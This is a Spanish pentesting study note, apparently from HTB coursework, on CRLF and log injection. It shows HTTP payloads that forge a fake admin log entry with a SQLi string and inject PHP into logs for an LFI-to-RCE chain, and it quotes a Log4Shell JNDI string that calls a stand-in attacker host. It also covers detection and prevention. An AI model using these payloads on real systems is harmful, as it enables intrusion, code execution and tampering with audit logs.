---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - HTTP/CRLF
Descripción: "Las aplicaciones registran detalles de cada petición (IP, ruta, parámetros) para depurar y para análisis de incidentes; un WAF además loguea lo que considera sospechoso"
Fecha de actualización: 2026-07-14
Nota previa: "[[01 - Introducción a CRLF Injection]]"
Nota siguiente: "[[03 - HTTP Response Splitting]]"
Area: "[[HTTP Attacks.base|HTTP Attacks]]"
---
---

Las aplicaciones registran detalles de cada petición (IP, ruta, parámetros) para depurar y para análisis de incidentes; un WAF además loguea lo que considera sospechoso. Si ese input llega al log **sin sanear los [[01 - Introducción a CRLF Injection|CRLF]]**, se puede <mark style="background: #FFB86CA6;">falsificar entradas de log</mark> o escalar a XSS/RCE por **log poisoning**.

# Identificación

Un formulario de contacto con logging "tipo WAF" bloquea ciertos caracteres por blacklist (una tentativa de `SQLi` se rechaza). Para ver el log, la app expone `/log.php` (en real esto está tras autenticación; a veces el `.log` queda en el working directory y es **público** — <mark style="background: #FF5582A6;">merece la pena fuzzear ficheros `.log`</mark>). El log muestra IP + usuario + mensaje, con los caracteres especiales **sin codificar**. Se prueba la sanitización de CRLF inyectando `%0d%0a`:

```http
POST /contact.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

name=testuser&email=t@test.htb&phone=123&message=test1%0d%0atest2
```

Si en `/log.php` aparecen `test1` y `test2` en **líneas separadas**, el salto de línea se inyectó.

# Explotación

**Log forging.** Inyectar una línea completa falsa que parezca de otro usuario:

```http
message=test1';%0a%0dMalicious+message+from+admin+(127.0.0.1):+'+OR+1=1+--+-
```

Esto inserta una entrada que aparenta que **el admin** intentó un SQLi. <mark style="background: #FFB86CA6;">Invalida el log entero</mark>: descubierta la inyección, los administradores no pueden saber qué entradas son reales y cuáles forjadas — un problema de trazabilidad y anti-forense.

**Log poisoning → RCE.** Si el log guarda tu input **sin codificar** y luego se **incluye** como PHP, hay ejecución. El clásico: inyectar código PHP en un campo logueado…

```http
message=<?php+echo+'pwned';+?>
```

…y después incluir el fichero de log vía un **[[01 - Local File Inclusion (LFI)|Local File Inclusion]]** (`/vuln.php?file=/var/log/apache2/access.log`), que ejecuta el PHP inyectado. Es una de las cadenas LFI→RCE más usadas — detallada en [[07 - Log Poisoning y envenenamiento de sesiones|Log Poisoning]] del módulo de File Inclusion; en real habrá filtros que bypasear.

> [!important] Log4Shell: el ápice moderno de "datos no confiables en logs"
> HTB no lo menciona, pero el caso más devastador de inyección en logs es **Log4Shell** (`CVE-2021-44228`, 2021). No es CRLF: Log4j **interpolaba** cadenas `${jndi:ldap://attacker/x}` presentes en **cualquier dato logueado** (un `User-Agent`, un campo de formulario) y hacía una petición JNDI que cargaba y ejecutaba código remoto. Afectó a medio Internet. La lección transversal: <mark style="background: #8000E1A6;">registrar datos controlados por el usuario es peligroso si el sistema de logs los **interpreta**</mark>, sea PHP incluido por LFI, JNDI en Log4j, o lo siguiente.

> [!warning] Vectores modernos que amplían el log forging
> - **Inyección de secuencias ANSI**: si un admin lee el log en una **terminal**, inyectar escapes `\x1b[` manipula colores/cursor para ocultar entradas, e incluso puede lograr RCE en emuladores de terminal vulnerables.
> - **XSS en el dashboard de logs**: si los logs se visualizan en un panel web (Kibana, Grafana, un `/log.php` que renderiza HTML), tu payload se convierte en **stored XSS** contra quien revise los logs.

# Detección y prevención

- **Detección**: inyecta `%0d%0a` en cada campo logueado; busca el `.log` (fuzzing) o el visor (`/log.php`) para confirmar la línea nueva.
- **Prevención**: **sanear/escapar los CRLF** (y en general codificar) antes de escribir al log; usar logging **estructurado** (JSON) donde el input es un valor, no parte de la sintaxis; y **nunca** interpretar datos logueados (ni PHP vía LFI, ni interpolación tipo Log4j).

## Referencias

- [OWASP — Log Injection](https://owasp.org/www-community/attacks/Log_Injection)
- [CVE-2021-44228 — Log4Shell](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
